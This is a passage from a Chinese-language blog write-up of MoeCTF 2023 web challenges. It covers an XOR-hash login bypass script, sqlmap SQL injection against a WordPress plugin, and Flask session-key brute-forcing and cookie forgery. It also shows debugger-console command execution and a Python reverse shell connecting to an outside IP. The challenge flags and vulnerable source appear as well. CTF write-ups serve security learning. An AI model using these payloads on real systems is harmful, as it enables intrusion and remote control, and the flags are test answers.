    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>
        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>
    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>仔细观察可以发现，当传入的参数items为2个时，该函数等价于求两个参数的异或值并返回<br>所以当两个参数相等时，不管该参数为何值，返回值都为0</p>
<p>这样子对于<code>hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))</code>，hashed的值是可控为0的</p>
<p>而对于</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users
<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>

hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012114109787.png" alt="image-20231012114109787"></p>
<p>这样子<code>v</code>也是可控为0的，从而使<code>hashed == v</code>成立，而<code>k</code>为admin，也使<code>k == &quot;admin&quot;</code>成立，从而得到flag</p>
<p>再看下面那串eval的代码，复制过来跑一下看看是什么意思</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012112141301.png" alt="image-20231012112141301"></p>
<p><code>for base64.b64encode in [base64.b64decode]</code>，说明这里把<code>base64.b64encode</code>覆写成了<code>base64.b64decode</code></p>
<p>所以接下来的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>
        <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>其实是对传入的数据进行了5次base64解码</p>
<p>而这个<code>decrypt</code>方法会在底下的参数解析中用到：<code>params = json.loads(decrypt(payload[&quot;params&quot;]))</code></p>
<p>结合上述的内容，编写脚本即可，注意username需要套一层引号</p>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64

url <span class="token operator">=</span> <span class="token string">"http://localhost:10566/login"</span>
username <span class="token operator">=</span> <span class="token string">"\"1\""</span>
password <span class="token operator">=</span> <span class="token string">"1"</span>
jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token operator">+</span> <span class="token string">",\"password\":"</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token operator">+</span> <span class="token string">"&#125;"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span> <span class="token operator">+</span> <span class="token string">"&#125;"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012114521271.png" alt="image-20231012114521271"></p>
<p>PS：<del>新生真的会做这种东西吗。。。</del></p>
<hr>
<h2 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h2><blockquote>
<p>sql报错注入</p>
</blockquote>
<p>根目录的flag是假的，直接进wordpress看看</p>
<p>给了个博客界面，发现存在一个php脚本</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012114927068.png" alt="image-20231012114927068"></p>
<p>双击访问</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor's identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/</span>

<span class="token comment">// 不许偷看！这些代码我还在调试呢！</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 加载数据库配置，暂时用硬编码绝对路径</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// 数据库用户名</span>
<span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// 数据库密码</span>
<span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// 数据库名称</span>
<span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// 数据库主机</span>

<span class="token comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span>
<span class="token comment">// 这些是临时的代码</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 检查连接是否成功</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据库连接失败: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span>

<span class="token comment">// 执行插入</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 检查插入是否成功</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入成功'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入失败: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 关闭数据库连接</span>
<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//gpt真好用</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最底下输出了”数据插入失败: You have an error in your SQL syntax; check the manual  that corresponds to your MySQL server version for the right syntax to  use near ‘03:47:50)’ at line 1”</p>
<p>猜测存在报错注入，测试一下发现注入点在time</p>
<p>直接sqlmap梭了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span> <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span> <span class="token parameter variable">--dbs</span>

python3 sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span> <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span> <span class="token parameter variable">-D</span> wordpress <span class="token parameter variable">--tables</span>

python3 sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span> <span class="token parameter variable">--data</span> <span class="token string">"time=1"</span> <span class="token parameter variable">-D</span> wordpress <span class="token parameter variable">-T</span> secret_of_kokomi <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag：<code>moectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;</code></p>
<hr>
<h2 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h2><blockquote>
<p>真实渗透</p>
</blockquote>
<h3 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h3><p>先随便注册个账号登录进去看看</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013110658694.png" alt="image-20231013110658694"></p>
<p>是flask框架，采用session密钥进行登录验证</p>
<p>看起来需要伪造session登录admin</p>
<p>对于key，后面这一段考虑使用python脚本进行暴力枚举</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>对应的工具Flask-Unsign：<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
<p>我们可以自己生成一个对应的爆破字典，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Sapphire037/article/details/126919498">美团CTF2022的easypickle</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'dict.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		a<span class="token operator">=</span><span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\"&#123;&#125;\"\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>进行爆破</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flask-unsign <span class="token parameter variable">--unsign</span> <span class="token parameter variable">--cookie</span> <span class="token string">"eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMzQ1NiJ9.ZSi0Og.Q3wqhZwMHiPvxIO4gJ8Tb7H6Tpc"</span> <span class="token parameter variable">--wordlist</span> dict.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013112748767.png" alt="image-20231013112748767"></p>
<p>得到密钥<code>This-random-secretKey-you-can&#39;t-getb950</code></p>
<p>然后用flask-session-cookie-manager进行伪造</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 flask_session_cookie_manager3.py encode <span class="token parameter variable">-s</span> <span class="token string">"This-random-secretKey-you-can't-getb950"</span> <span class="token parameter variable">-t</span> <span class="token string">"&#123;'power': 'admin', 'user': '123456'&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013113247738.png" alt="image-20231013113247738"></p>
<p>把这个session带回cookie里，可以发现多了几篇留言</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013113352349.png" alt="image-20231013113352349"></p>
<p>其中出现了pin码泄露<code>138-429-604</code></p>
<p>那就可以进console调试模式命令执行了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231013113752504.png" alt="image-20231013113752504"></p>
<p>得到前半段flag：<code>moectf&#123;Information-leakage-Is-dangerous!</code></p>
<p>外网的部分到此结束</p>
<h3 id="内网部分-未完成"><a href="#内网部分-未完成" class="headerlink" title="内网部分(未完成)"></a>内网部分(未完成)</h3><p>读取readme</p>
<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">恭喜你通过外网渗透拿下了本台服务器的权限
接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan
你需要了解它的基本用法，然后扫描内网的ip段
如果你进行了正确的操作，会得到类似下面的结果
10.1.11.11:22 open
10.1.23.21:8080 open
10.1.23.23:9000 open
将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）
注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务
对密码有疑问随时咨询出题人<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>反弹shell到vps（我这里用的是花生壳内网穿透弹shell）：在线生成反弹shell命令<a target="_blank" rel="noopener" href="https://www.ddosi.org/shell/">https://www.ddosi.org/shell/</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"115.236.153.170"</span><span class="token punctuation">,</span><span class="token number">35940</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在内网里拿到题目源码</p>
<p>app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> curses <span class="token keyword">import</span> flash
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> session<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> flash
<span class="token keyword">import</span> os
<span class="token keyword">import</span> dataSql
<span class="token keyword">import</span> datetime
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>template_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static/templates"</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>static_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"static"</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"This-random-secretKey-you-can't-get"</span> <span class="token operator">+</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>canLogin<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
            session<span class="token punctuation">[</span><span class="token string">'power'</span><span class="token punctuation">]</span> <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>getPower<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">"username or password incorrect"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''&lt;script>alert("You have already logged in.");window.location.href="/index";&lt;/script>'''</span>

<span class="token comment"># change the password</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">foundpwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'changepwd.html'</span><span class="token punctuation">)</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
    oldPassword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'oldPassword'</span><span class="token punctuation">]</span>
    newPassword <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'newPassword'</span><span class="token punctuation">]</span>
    a <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>changePassword<span class="token punctuation">(</span>username<span class="token punctuation">,</span> oldPassword<span class="token punctuation">,</span> newPassword<span class="token punctuation">)</span>
    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    change successfully
    &lt;br>
    &lt;a href='login'>login now&lt;/a>
    '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'change'</span><span class="token punctuation">)</span>


<span class="token comment"># register for enter the message board</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>
    <span class="token builtin">id</span> <span class="token operator">=</span> dataSql<span class="token punctuation">.</span>usersName<span class="token punctuation">(</span><span class="token punctuation">)</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>
    power <span class="token operator">=</span> <span class="token string">'guest'</span>
    <span class="token keyword">if</span> dataSql<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> power<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
    register successfully
    &lt;br>
    &lt;a href='login'>login now&lt;/a>
    '''</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flash<span class="token punctuation">(</span><span class="token string">'username already exists'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'register'</span><span class="token punctuation">)</span>


